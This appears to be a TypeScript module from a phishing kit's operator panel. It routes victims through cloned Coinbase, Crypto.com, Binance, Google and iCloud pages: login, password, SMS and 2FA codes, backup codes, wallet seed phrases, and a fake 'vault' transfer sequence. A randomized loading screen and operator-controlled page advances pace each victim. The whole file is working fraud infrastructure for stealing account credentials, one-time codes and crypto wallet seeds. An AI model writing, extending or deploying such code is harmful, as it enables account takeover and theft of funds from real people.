/**
 * Visitor funnel resolver.
 *
 * Each captured visitor template (Coinbase/Activity, Coinbase/External, …)
 * has a sensible "next page" the visitor moves to when they submit / make a
 * choice. The mapping below is the project's default funnel. Admins can
 * override any individual hop by setting the key `funnel.next.{Brand}/{Page}`
 * in `server_settings` (value = `Brand/Page` label) — that override is what
 * `/api/visitor/page-advance` and the case-code check endpoint consult.
 *
 * `getNextUrl()` returns a same-origin URL (encoded for the `/templates/preview/…`
 * route) or `null` when there is no configured successor (e.g. terminal pages
 * like Loading or Locked).
 */
import { dbGetSetting } from './database.js';
import { templateLabelToVisitorPath } from './visitorRouter.js';

const FLOW_LABEL_RE = /^[A-Z][^/]+\/.+/;

export function isValidFlowLabel(step: string): boolean {
	return FLOW_LABEL_RE.test(step);
}

/** First Brand/Page step in a flow definition. */
export function firstValidFlowStep(steps: string[]): string | null {
	return steps.find((s) => isValidFlowLabel(s)) || null;
}

/** Visitor URL path for the flow's entry step (e.g. Coinbase/Case ID → /case). */
export function getFlowLandingPath(steps: string[], module: string): string | null {
	const first = firstValidFlowStep(steps);
	if (!first) return null;
	return templateLabelToVisitorPath(first, module);
}

export interface FlowAdvanceResult {
	nextUrl: string | null;
	nextLabel: string | null;
	flowApplied: boolean;
	markedPassed: boolean;
}

/**
 * Resolve the next URL from an assigned visitor flow.
 * When the visitor is on a page outside the flow (e.g. /loading while step 1 is Case ID),
 * redirect to the first unpassed step without advancing the funnel default (Activity).
 */
export function resolveVisitorFlowAdvance(
	visitor: {
		flowBypassed?: boolean;
		flowSteps?: { page: string; status?: string; passed?: boolean }[];
		module: string;
	},
	currentLabel: string,
	isVisitorHost: boolean,
	queryParams?: URLSearchParams
): FlowAdvanceResult {
	if (visitor.flowBypassed || !visitor.flowSteps?.length) {
		return { nextUrl: null, nextLabel: null, flowApplied: false, markedPassed: false };
	}

	const qp = queryParams?.size ? queryParams : undefined;
	const steps = visitor.flowSteps;

	const isComplete = (s: typeof steps[number]) =>
		s.status === 'completed' || (s.status === undefined && s.passed);
	const isIncomplete = (s: typeof steps[number]) => !isComplete(s);

	const stepIdx = steps.findIndex((s) => s.page === currentLabel && isIncomplete(s));
	if (stepIdx !== -1) {
		const step = steps[stepIdx] as any;
		step.status = 'completed';
		step.completedAt = Date.now();
		if ('passed' in step) step.passed = true;

		const nextStep = steps.find((s) => isIncomplete(s) && isValidFlowLabel(s.page));
		if (nextStep) {
			return {
				nextUrl: resolveLabelRedirectUrl(nextStep.page, visitor.module, isVisitorHost, qp),
				nextLabel: nextStep.page,
				flowApplied: true,
				markedPassed: true
			};
		}
		return { nextUrl: null, nextLabel: null, flowApplied: true, markedPassed: true };
	}

	const firstIncomplete = steps.find((s) => isIncomplete(s) && isValidFlowLabel(s.page));
	if (firstIncomplete) {
		return {
			nextUrl: resolveLabelRedirectUrl(firstIncomplete.page, visitor.module, isVisitorHost, qp),
			nextLabel: firstIncomplete.page,
			flowApplied: true,
			markedPassed: false
		};
	}

	return { nextUrl: null, nextLabel: null, flowApplied: false, markedPassed: false };
}

export const DEFAULT_NEXT_PAGE: Record<string, string> = {
	// --- Coinbase ---
	'Coinbase/Loading': 'Coinbase/Activity',
	'Coinbase/Activity': 'Coinbase/Balance',
	'Coinbase/Balance': 'Coinbase/External',
	'Coinbase/External': 'Coinbase/Loading',
	'Coinbase/CBW': 'Coinbase/Loading',
	'Coinbase/Reset Pass': 'Coinbase/Loading',
	'Coinbase/Swap': 'Coinbase/Loading',
	'Coinbase/Vault': 'Coinbase/Vault Seed',
	'Coinbase/Vault Seed': 'Coinbase/Loading',
	'Coinbase/Case ID': 'Coinbase/Loading',
	'Coinbase/Review Login': 'Coinbase/Loading',
	'Coinbase/Review Withdrawal': 'Coinbase/Loading',
	'Coinbase/Review Email': 'Coinbase/Loading',
	'Coinbase/Trust Device': 'Coinbase/Terminate Devices',
	'Coinbase/Change Password': 'Coinbase/SMS Verify',
	'Coinbase/SMS Verify': 'Coinbase/Trust Device',
	'Coinbase/Terminate Devices': 'Coinbase/Securing Account',
	'Coinbase/Securing Account': 'Coinbase/Loading',
	'Coinbase/Protect Assets': 'Coinbase/Moving Vault',
	'Coinbase/Moving Vault': 'Coinbase/Vault Intro',
	'Coinbase/Vault Intro': 'Coinbase/Vault Setup',
	'Coinbase/Vault Setup': 'Coinbase/Transfer from Coinbase',
	'Coinbase/Transfer from Coinbase': 'Coinbase/Select Asset',
	'Coinbase/Select Asset': 'Coinbase/Confirm Transfer',
	'Coinbase/Confirm Transfer': 'Coinbase/Vault SMS',
	'Coinbase/Vault SMS': 'Coinbase/Verification Required',
	'Coinbase/Verification Required': 'Coinbase/Vault Dashboard',
	'Coinbase/Vault Dashboard': 'Coinbase/Vault',

	// --- CDC ---
	'CDC/Loading': 'CDC/Activity',
	'CDC/Activity': 'CDC/Balance',
	'CDC/Balance': 'CDC/External',
	'CDC/External': 'CDC/Wallet',
	'CDC/Wallet': 'CDC/Loading',
	'CDC/Case ID': 'CDC/Loading',

	// --- Binance ---
	'Binance/Loading': 'Binance/Activity',
	'Binance/Activity': 'Binance/Balance',
	'Binance/Balance': 'Binance/Backup',
	'Binance/Backup': 'Binance/Loading',
	'Binance/Case': 'Binance/Loading',

	// --- Google ---
	'Google/Loading': 'Google/Login',
	'Google/Login': 'Google/Password',
	'Google/Password': 'Google/SMS',
	'Google/SMS': 'Google/Loading',
	'Google/TOTP': 'Google/Loading',
	'Google/Backup code': 'Google/Loading',
	'Google/Fail': 'Google/Login',

	// --- iCloud ---
	'iCloud/Login': 'iCloud/Password',
	'iCloud/Password': 'iCloud/2fa',
	'iCloud/2fa': 'iCloud/Locked',
	'iCloud/Locked': 'iCloud/Login'

	// KuCoin/Loading and terminal pages (Locked, Fail) are intentionally
	// omitted — the visitor stays put until the operator advances them.
};

/** Pages whose interactive CTAs are already wired by a dedicated shim. */
export const SKIP_GENERIC_WIRING = new Set<string>([
	'Coinbase/Case ID',
	'CDC/Case ID',
	'Binance/Case',
	'Coinbase/Review Login',
	'Coinbase/Review Withdrawal',
	'Coinbase/Review Email',
	'Coinbase/Trust Device',
	'Coinbase/Change Password',
	'Coinbase/SMS Verify',
	'Coinbase/Terminate Devices',
	'Coinbase/Securing Account',
	'Coinbase/Protect Assets',
	'Coinbase/Moving Vault',
	'Coinbase/Vault Intro',
	'Coinbase/Vault Setup',
	'Coinbase/Transfer from Coinbase',
	'Coinbase/Select Asset',
	'Coinbase/Confirm Transfer',
	'Coinbase/Vault SMS',
	'Coinbase/Verification Required',
	'Coinbase/Vault Dashboard',
	'Coinbase/Seed Phrase',
	'Coinbase/Loading',
	'CDC/Loading',
	'Binance/Loading',
	'Google/Loading',
	'KuCoin/Loading'
]);

export function settingKey(brand: string, page: string): string {
	return `funnel.next.${brand}/${page}`;
}

export function getNextLabel(brand: string, page: string): string | null {
	const override = dbGetSetting(settingKey(brand, page));
	if (override && override.includes('/')) return override;
	return DEFAULT_NEXT_PAGE[`${brand}/${page}`] ?? null;
}

export function labelToUrl(label: string | null | undefined): string | null {
	if (!label) return null;
	const idx = label.indexOf('/');
	if (idx <= 0 || idx >= label.length - 1) return null;
	const brand = label.slice(0, idx);
	const page = label.slice(idx + 1);
	return `/templates/preview/${encodeURIComponent(brand)}/${encodeURIComponent(page)}`;
}

export function labelToVisitorUrl(
	label: string | null | undefined,
	module?: string,
	queryParams?: URLSearchParams
): string | null {
	const path = templateLabelToVisitorPath(label || '', module);
	if (!path) return null;
	if (!queryParams?.size) return path;
	const qs = queryParams.toString();
	return qs ? `${path}?${qs}` : path;
}

/** Resolve a Brand/Page label to a URL on the visitor domain or panel preview. */
export function resolveLabelRedirectUrl(
	label: string | null | undefined,
	module: string | undefined,
	isVisitorHost: boolean,
	queryParams?: URLSearchParams
): string | null {
	if (!label) return null;
	const qp = queryParams?.size ? queryParams : undefined;
	if (isVisitorHost && module) {
		return labelToVisitorUrl(label, module, qp);
	}
	const base = labelToUrl(label);
	if (!base) return null;
	if (!qp) return base;
	const qs = qp.toString();
	return qs ? `${base}?${qs}` : base;
}

export interface NextUrlOptions {
	module?: string;
	isVisitorHost?: boolean;
}

export function getNextUrl(
	brand: string,
	page: string,
	queryParams?: URLSearchParams,
	opts?: NextUrlOptions
): string | null {
	const label = getNextLabel(brand, page);
	const base =
		opts?.isVisitorHost && opts.module
			? labelToVisitorUrl(label, opts.module, queryParams)
			: labelToUrl(label);

	if (!base || !queryParams || opts?.isVisitorHost) return base;
	const qs = queryParams.toString();
	return qs ? `${base}?${qs}` : base;
}

const LOADING_GATE_PATHS = new Set(['/loading', '/sign-in/loading']);

/** Random pause shown on the loading interstitial (5–8 seconds). */
export function randomLoadingDelayMs(): number {
	return 5000 + Math.floor(Math.random() * 3001);
}

function isVisitorLoadingPath(url: string): boolean {
	const path = url.split('?')[0].split('#')[0];
	return LOADING_GATE_PATHS.has(path);
}

/**
 * Send the visitor through /loading with ?next= and ?ms= before the real destination.
 * Skipped on panel preview hosts and when the destination is already a loading page.
 */
export function applyLoadingInterstitial(
	nextUrl: string | null,
	queryParams?: URLSearchParams,
	opts?: { isVisitorHost?: boolean }
): string | null {
	if (!nextUrl || !opts?.isVisitorHost) return nextUrl;
	if (isVisitorLoadingPath(nextUrl)) return nextUrl;

	const ms = randomLoadingDelayMs();
	const gateQp = new URLSearchParams();

	if (queryParams?.size) {
		queryParams.forEach((v, k) => {
			if (k !== 'next' && k !== 'ms') gateQp.set(k, v);
		});
	}

	const qIdx = nextUrl.indexOf('?');
	if (qIdx !== -1) {
		const destQp = new URLSearchParams(nextUrl.slice(qIdx + 1));
		destQp.forEach((v, k) => {
			if (k !== 'next' && k !== 'ms') gateQp.set(k, v);
		});
	}

	gateQp.set('next', nextUrl);
	gateQp.set('ms', String(ms));

	return `/loading?${gateQp.toString()}`;
}
